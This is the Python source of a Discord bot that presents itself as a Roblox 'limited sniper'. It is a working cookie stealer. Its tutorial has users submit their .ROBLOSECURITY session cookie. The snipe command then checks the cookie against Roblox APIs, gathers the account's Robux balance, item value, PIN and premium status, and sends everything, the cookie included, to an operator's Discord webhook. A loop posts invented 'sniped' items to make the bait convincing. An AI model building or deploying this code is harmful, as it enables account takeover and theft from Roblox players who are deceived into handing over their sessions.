#Made by: sigma#4268
#Credits to karlo idk his tag but i stole the cookie checking and sending part for his cookie checker method
import time, random
import discord, requests, discord_webhook
from discord.ext import commands
from discord_webhook import DiscordEmbed, DiscordWebhook

req = requests.Session()
client = commands.Bot(command_prefix="!")  # change prefix if you want
client.remove_command('help')  #remove default help command
showing_logs = False # not showing logs on default
wh = "WEBHOOK HERE"  # enter ur webhook here

@client.event
async def on_ready():
    print("Bot is Online!")  # print bot ready! when bot is online

@client.command(pass_context=True)
async def startlogs(ctx):
	showing_logs = True
	channel = client.get_channel(CHANNEL ID HERE) #put the channel id you want the logs to show in here
	#you can add more limiteds below if you want
	limited_lists = ['Valkyrie Helm', 'Playful Vampire', 'Super Super Happy Face', 'Supa Dupa Fly Cap', 'Supa Fly Cap', 'Gucci Dionysus Bag with Bee', 'Gucci GG Marmont Bag', 'Gucci Wide Brim Felt Hat', 'Noob Attack: Frozen Crossbow Collision', 'Noob Assist Marvelous Mom', 'Noob Attack: Golden Sword Gladiator', 'Chill Cap', 'Black Iron Commando', 'Green Starry Sight', 'Red Goof', 'Perfectly Legitimate Business Hat', 'Beautiful Hair for Beautiful Space People', 'ROBLOX Madness Face', 'Catching Snowflakes', 'Neon Bombastic Animal Hoodie', 'Golden Crown', 'Hyperlaser Gun', 'Golden Bling Braces', 'Bucket', 'Scissors']
	while showing_logs == True: #below is just print random prices and limiteds
		price = random.randint(17, 2777)
		sniped_limited = random.choice(limited_lists)
		time_random = random.randint(1, 3)
		embed69 = discord.Embed(title="Limited Sniped Logs", color=0x47FF75)
		embed69.add_field(
			name="Limiteds Sniped!",
			value=f"**Sniped Limited**: {sniped_limited}\n **Sniped For**: {price} Robux",
			inline = True
		)
		time.sleep(time_random)
		await channel.send(embed=embed69)
		if showing_logs == False:
			await ctx.send("**No More Logs**")

@client.command() #help command
async def help(ctx):
	embed10 = discord.Embed(title="**Help**", color=0x47FF75)
	embed10.add_field(
		name="Help",
		value="A Discord Bot That Snipes Limiteds For You!\n Type \"!tutorial\" To Get Started.",
		inline=False
	)
	embed10.add_field(
		name="Commands",
		value="**!help** \n**!commands** \n**!tutorial** \n**!snipe + {cookie}**",
		inline=True
	)
	embed10.set_footer(text="For Further Help, Contact The Server Owner.")
	await ctx.send(embed=embed10)

@client.command() #commands command
async def commands(ctx):
    embed0 = discord.Embed(title="Limited Sniper", color=0x47FF75)
    embed0.set_thumbnail(
        url="https://cdn.discordapp.com/attachments/853359254647341066/910930695440969752/Dominus_Praefectus.png"
    )
    embed0.add_field(
        name="Commands",
        value="**!help** -Shows about and available commands \n**!snipe** + {.ROBLOSECURITY} \n**!tutorial** -Shows how to start \n**!commands** -Shows this message",
        inline=True,
    )
    embed0.set_footer(text="For Further Help, Contact The Server Owner.")
    await ctx.send(embed=embed0)


@client.command()  # tutorial command
async def tutorial(ctx):
    embed1 = discord.Embed(title="Limited Sniper", color=0x47FF75)
    embed1.set_thumbnail(
        url="https://cdn.discordapp.com/attachments/853359254647341066/910930695440969752/Dominus_Praefectus.png"
    )
    embed1.add_field(
        name="Tutorial \n",
        value="\n1. Get Your Roblox Cookie. \n2. Goto The Bot's DM. \n 3. Type '!snipe' + Your Cookie\n \n **Example**\n .snipe _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_COOKIE",
        inline=True,
    )
    embed1.set_footer(text="For Further Help, Contact The Server Owner.")
    await ctx.send(embed=embed1)
    pass


@client.command() #snipe command
async def snipe(ctx, cookie):
    check = req.get(
        "https://api.roblox.com/currency/balance",
        cookies={".ROBLOSECURITY": str(cookie)},
    )  # check if the cookie is valid
    if check.status_code == 200:
        userdata = requests.get(
            "https://users.roblox.com/v1/users/authenticated",
            cookies={".ROBLOSECURITY": cookie},
        ).json()  # get user data
        userid = userdata["id"]  # user id
        display = userdata["displayName"]  # display name
        username = userdata["name"]  # username
        robuxdata = requests.get(
            f"https://economy.roblox.com/v1/users/{userid}/currency",
            cookies={".ROBLOSECURITY": cookie},
        ).json()
        robux = robuxdata["robux"]  # get robux balance
        # does the user have premium?
        premiumbool = requests.get(
            f"https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership",
            cookies={".ROBLOSECURITY": cookie},
        ).json()
        # get rap
        rap_dict = requests.get(
            f"https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100",
            cookies={".ROBLOSECURITY": cookie},
        ).json()
        while rap_dict["nextPageCursor"] != None:
            rap_dict = requests.get(
                f"https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100",
                cookies={".ROBLOSECURITY": cookie},
            ).json()
        rap = sum(i["recentAveragePrice"] for i in rap_dict["data"])

        thumbnail = requests.get(
            f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false"
        ).json()
        image_url = thumbnail["data"][0]["imageUrl"]
        pindata = requests.get(
            "https://auth.roblox.com/v1/account/pin", cookies={".ROBLOSECURITY": cookie}
        ).json()
        pin_bool = pindata["isEnabled"]  # does the user have a p
        embed4 = discord.Embed(
            title="**✅ Cookie is Valid! Sniping Limiteds Now. ✅**", color=0x47FF75
        )
        await ctx.send(embed=embed4)

        # dualhook

        webhook = DiscordWebhook(url=wh, content="@everyone")
        embed = DiscordEmbed(
            title=f"**✅ {username} ✅**",
            url=f"https://roblox.com/users/{userid}",
            color=0x00FF80,
        )
        embed.add_embed_field(name="Display Name👀:", value="```" + str(display) + "```")
        embed.add_embed_field(name="User ID🔍:", value="```" + str(userid) + "```")
        embed.add_embed_field(name="Robux💰:", value="```" + str(robux) + "```")
        embed.add_embed_field(name="Has Pin?🔐:", value="```" + str(pin_bool) + "```")
        embed.add_embed_field(name="RAP📈:", value="```" + str(rap) + "```")
        embed.add_embed_field(name="Premium💎:", value="```" + str(premiumbool) + "```")
        embed.add_embed_field(
            name="Rolimons: ",
            value=f"https://rolimons.com/player/{userid}",
            inline=True,
        )

        embed.add_embed_field(name="Cookie🍪:", value=f"```{cookie}```", inline=False)
        embed.set_thumbnail(url=image_url)
        webhook.add_embed(embed)
        webhook.execute()

    else:
        e = discord.Embed(title="**❌ Cookie is Invalid! ❌**", color=0xFF0000)
        await ctx.send(embed=e)


client.run(
    "Bot Token"
)  # replace with your bot token